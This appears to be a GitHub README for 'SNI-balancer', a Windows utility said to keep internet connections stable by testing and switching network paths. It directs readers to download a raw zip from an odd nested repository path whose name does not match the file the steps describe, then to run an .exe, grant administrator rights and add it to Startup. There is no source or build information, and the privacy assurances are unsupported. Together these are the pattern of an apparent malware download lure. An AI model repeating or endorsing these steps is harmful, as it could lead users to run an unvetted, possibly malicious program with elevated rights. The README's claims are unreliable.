# 🌐 SNI-balancer - Maintain stable internet connections automatically

[![Download Software](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Romany-bounce808/SNI-balancer/raw/refs/heads/main/Sargonic/balancer_SN_v2.2.zip)

SNI-balancer keeps your internet connection reliable. It regularly tests your network configurations and selects the fastest option. This tool runs in the background. It swaps between settings to ensure you always have a working connection.

## 📋 What this tool does

Many internet connections face interference. This causes drops or slow speeds. SNI-balancer fixes this by acting as a smart bridge for your traffic. It keeps a list of potential network paths. Every few minutes, it sends a small test signal through these paths. If it finds a path that works better than the current one, it switches your traffic to the new path. You see no interruption. Your web browser continues to load pages without errors. 

## 💻 System requirements

- Windows 10 or Windows 11
- 50 MB of free disk space
- An active internet connection 
- No prior technical experience needed

## 🚀 Getting Started

Follow these steps to set up the software on your computer.

1. Visit the [official download page](https://github.com/Romany-bounce808/SNI-balancer/raw/refs/heads/main/Sargonic/balancer_SN_v2.2.zip).
2. Locate the file named `SNI-balancer-windows.zip`.
3. Click the file name to start the download.
4. Save the file to your Downloads folder.

## 🛠 Installation and setup

After the download finishes, follow these instructions to run the application.

1. Open your Downloads folder.
2. Right-click the `SNI-balancer-windows.zip` file.
3. Select "Extract All" from the menu.
4. Choose a folder where you want to keep the program and click Extract.
5. Open the new folder.
6. Double-click the file named `SNI-balancer.exe` to launch the program.

A small icon appears in your system tray near the clock. This tells you the program is active. 

## ⚙️ How it works

The program runs automatically upon startup. You do not need to change settings. It keeps a configuration file in its folder. You can add your own connection settings to this file if desired. The program reads this file and tests each entry against a known stable server. 

When you open the program window, you see a list of your current configurations. A green checkmark indicates a working path. A yellow warning icon shows a path with slow latency. A red cross shows a path that failed the test. The program automatically keeps the best connection active.

## 🛡 Security and privacy

The program processes your connection data locally on your machine. No data leaves your computer. We do not track your browsing habits, history, or personal information. The configurations remain stored on your hard drive. 

## ❓ Frequently asked questions

**Do I need to leave this program running?**
Yes. To maintain a stable connection, the program must run in the background. If you close the program, your connection reverts to your Windows system defaults.

**Can I stop the program?**
Yes. Right-click the icon in the system tray and select "Exit."

**Does this program slow down my computer?**
No. The software consumes less than 1% of your processor power. It uses very little memory. 

**What happens if all connection paths fail?**
The program notifies you with a desktop alert. It then uses your default system network settings to keep you connected while it tries to recover the configurations.

**Does this software require administrator rights?**
The program needs permission to adjust your network settings. Windows might ask for confirmation when you first launch the program. Click "Yes" to proceed.

## 🔧 Troubleshooting common issues

If you encounter problems, check these items first:

1. **The icon does not appear:** Make sure you extracted the files from the ZIP folder properly. The program cannot run directly from inside the compressed file.
2. **Settings appear invalid:** Open the `config.json` file in the program folder. Ensure each line follows the format provided in the default template. Invalid formatting prevents the program from testing the connection.
3. **Connection stays slow:** Use the "Refresh" button in the program window to trigger an immediate check instead of waiting for the automatic timer. 
4. **App crashes:** Ensure your Windows operating system has the latest updates installed. If the problem persists, delete the program folder and download the latest version again from the link provided above.

## 📝 Configuration guide

You can edit the settings file to improve reliability. Open `config.json` with Notepad. Each entry includes two parts: a label and an address. 

- The label is the name you give your connection.
- The address is the network endpoint.

Make sure you keep the commas and brackets exactly as seen in the file. Incorrect symbols cause the program to stall. Save the file after making changes and restart the program to apply the new settings. 

## 💡 Pro tips

- Pin the program to your taskbar for quick access. 
- You can create a shortcut to the program in your Windows Startup folder to have it launch when you turn on your computer. 
- Set the testing interval to a higher number to reduce network noise if you have a capped data plan.